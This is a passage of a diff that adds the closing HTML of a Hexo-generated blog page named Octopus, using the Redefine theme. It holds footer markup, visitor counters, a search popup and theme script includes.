+	</div>
+</div>
+	</div>
+	
+</div>
+			</div>
+
+			
+		</div>
+
+		<div class="main-content-footer">
+			<footer class="footer mt-5 py-5 h-auto text-base text-third-text-color relative border-t-2 border-t-border-color">
+    <div class="info-container py-3 text-center">
+        
+        <div class="text-center">
+            &copy;
+            
+              <span>2025</span>
+              -
+            
+            2025&nbsp;&nbsp;<i class="fa-solid fa-heart fa-beat" style="--fa-animation-duration: 0.5s; color: #f54545"></i>&nbsp;&nbsp;<a href="/">Octopus</a>
+            
+                
+                <p class="post-count space-x-0.5">
+                    <span>
+                        共撰写了 5 篇文章
+                    </span>
+                    
+                </p>
+            
+        </div>
+        
+            <script data-swup-reload-script src="https://cn.vercount.one/js"></script>
+            <div class="relative text-center lg:absolute lg:right-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-right">
+                
+                    <span id="busuanzi_container_site_uv" class="lg:!block">
+                        <span class="text-sm">访问人数</span>
+                        <span id="busuanzi_value_site_uv"></span>
+                    </span>
+                
+                
+                    <span id="busuanzi_container_site_pv" class="lg:!block">
+                        <span class="text-sm">总访问量</span>
+                        <span id="busuanzi_value_site_pv"></span>
+                    </span>
+                
+            </div>
+        
+        <div class="relative text-center lg:absolute lg:left-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-left">
+            <span class="lg:block text-sm">由 <?xml version="1.0" encoding="utf-8"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg class="relative top-[2px] inline-block align-baseline" version="1.1" id="圖層_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="1rem" height="1rem" viewBox="0 0 512 512" enable-background="new 0 0 512 512" xml:space="preserve"><path fill="#0E83CD" d="M256.4,25.8l-200,115.5L56,371.5l199.6,114.7l200-115.5l0.4-230.2L256.4,25.8z M349,354.6l-18.4,10.7l-18.6-11V275H200v79.6l-18.4,10.7l-18.6-11v-197l18.5-10.6l18.5,10.8V237h112v-79.6l18.5-10.6l18.5,10.8V354.6z"/></svg><a target="_blank" class="text-base" href="https://hexo.io">Hexo</a> 驱动</span>
+            <span class="text-sm lg:block">主题&nbsp;<a class="text-base" target="_blank" href="https://github.com/EvanNotFound/hexo-theme-redefine">Redefine v2.8.2</a></span>
+        </div>
+        
+        
+            <div>
+                博客已运行 <span class="odometer" id="runtime_days" ></span> 天 <span class="odometer" id="runtime_hours"></span> 小时 <span class="odometer" id="runtime_minutes"></span> 分钟 <span class="odometer" id="runtime_seconds"></span> 秒
+            </div>
+        
+        
+            <script data-swup-reload-script>
+                try {
+                    function odometer_init() {
+                    const elements = document.querySelectorAll('.odometer');
+                    elements.forEach(el => {
+                        new Odometer({
+                            el,
+                            format: '( ddd).dd',
+                            duration: 200
+                        });
+                    });
+                    }
+                    odometer_init();
+                } catch (error) {}
+            </script>
+        
+        
+        
+    </div>  
+</footer>
+		</div>
+	</div>
+
+	
+	<div class="post-tools">
+		<div class="post-tools-container">
+	<ul class="article-tools-list">
+		<!-- TOC aside toggle -->
+		
+		<li class="right-bottom-tools page-aside-toggle">
+			<i class="fa-regular fa-outdent"></i>
+		</li>
+		
+
+		<!-- go comment -->
+		
+		<li class="go-comment">
+			<i class="fa-regular fa-comments"></i>
+		</li>
+		
+	</ul>
+</div>
+	</div>
+	
+
+	<div class="right-side-tools-container">
+		<div class="side-tools-container">
+	<ul class="hidden-tools-list">
+		<li class="right-bottom-tools tool-font-adjust-plus flex justify-center items-center">
+			<i class="fa-regular fa-magnifying-glass-plus"></i>
+		</li>
+
+		<li class="right-bottom-tools tool-font-adjust-minus flex justify-center items-center">
+			<i class="fa-regular fa-magnifying-glass-minus"></i>
+		</li>
+
+		<li class="right-bottom-tools tool-dark-light-toggle flex justify-center items-center">
+			<i class="fa-regular fa-moon"></i>
+		</li>
+
+		<!-- rss -->
+		
+
+		
+
+		<li class="right-bottom-tools tool-scroll-to-bottom flex justify-center items-center">
+			<i class="fa-regular fa-arrow-down"></i>
+		</li>
+	</ul>
+
+	<ul class="visible-tools-list">
+		<li class="right-bottom-tools toggle-tools-list flex justify-center items-center">
+			<i class="fa-regular fa-cog fa-spin"></i>
+		</li>
+		
+		<li class="right-bottom-tools tool-scroll-to-top flex justify-center items-center">
+			<i class="arrow-up fas fa-arrow-up"></i>
+			<span class="percent"></span>
+		</li>
+		
+		
+	</ul>
+</div>
+	</div>
+
+	<div class="image-viewer-container">
+	<img src="">
+</div>
+
+	
+	<div class="search-pop-overlay">
+	<div class="popup search-popup">
+		<div class="search-header">
+			<span class="search-input-field-pre">
+				<i class="fa-solid fa-keyboard"></i>
+			</span>
+			<div class="search-input-container">
+				<input autocomplete="off" autocorrect="off" autocapitalize="off" placeholder="站内搜索您需要的内容..." spellcheck="false" type="search" class="search-input">
+			</div>
+			<span class="popup-btn-close">
+				<i class="fa-solid fa-times"></i>
+			</span>
+		</div>
+		<div id="search-result">
+			<div id="no-result">
+				<i class="fa-solid fa-spinner fa-spin-pulse fa-5x fa-fw"></i>
+			</div>
+		</div>
+	</div>
+</div>
+	
+
+</main>
+
+
+
+<script src="/js/build/libs/Swup.min.js"></script>
+
+<script src="/js/build/libs/SwupSlideTheme.min.js"></script>
+
+<script src="/js/build/libs/SwupScriptsPlugin.min.js"></script>
+
+<script src="/js/build/libs/SwupProgressPlugin.min.js"></script>
+
+<script src="/js/build/libs/SwupScrollPlugin.min.js"></script>
+
+<script src="/js/build/libs/SwupPreloadPlugin.min.js"></script>
+
+<script>
+    const swup = new Swup({
+        plugins: [
+            new SwupScriptsPlugin({
+                optin: true,
+            }),
+            new SwupProgressPlugin(),
+            new SwupScrollPlugin({
+                offset: 80,
+            }),
+            new SwupSlideTheme({
+                mainElement: ".main-content-body",
+            }),
+            new SwupPreloadPlugin(),
+        ],
+        containers: ["#swup"],
+    });
+</script>
+
+
+
+
+	
+<script src="/js/build/tools/imageViewer.js" type="module"></script>
+
+<script src="/js/build/utils.js" type="module"></script>
+
+<script src="/js/build/main.js" type="module"></script>
+
+<script src="/js/build/layouts/navbarShrink.js" type="module"></script>
+
+<script src="/js/build/tools/scrollTopBottom.js" type="module"></script>
+
+<script src="/js/build/tools/lightDarkSwitch.js" type="module"></script>
+
+<script src="/js/build/layouts/categoryList.js" type="module"></script>
+
+
+
+    
+<script src="/js/build/tools/localSearch.js" type="module"></script>
+
+
+
+
+    
+<script src="/js/build/tools/codeBlock.js" type="module"></script>
+
+
+
+
+    
+<script src="/js/build/layouts/lazyload.js" type="module"></script>
+
+
+
+
+    
+<script src="/js/build/tools/runtime.js"></script>
+
+    
+<script src="/js/build/libs/odometer.min.js"></script>
+
+    
+<link rel="stylesheet" href="/assets/odometer-theme-minimal.css">
+
+
+
+
+  
+<script src="/js/build/libs/Typed.min.js"></script>
+
+  
+<script src="/js/build/plugins/typed.js" type="module"></script>
+
+
+
+
+
+
+
+
+    
+<script src="/js/build/libs/anime.min.js"></script>
+
+
+
+
+
+    
+<script src="/js/build/tools/tocToggle.js" type="module" data-swup-reload-script=""></script>
+
+<script src="/js/build/layouts/toc.js" type="module" data-swup-reload-script=""></script>
+
+<script src="/js/build/plugins/tabs.js" type="module" data-swup-reload-script=""></script>
+
+
+
+
+<script src="/js/build/libs/moment-with-locales.min.js" data-swup-reload-script=""></script>
+
+
+<script src="/js/build/layouts/essays.js" type="module" data-swup-reload-script=""></script>
+
+
+
+
+
+    
+<script src="/js/build/layouts/bookmarkNav.js" type="module"></script>
+
+
+	
+</body>
+
+</html>
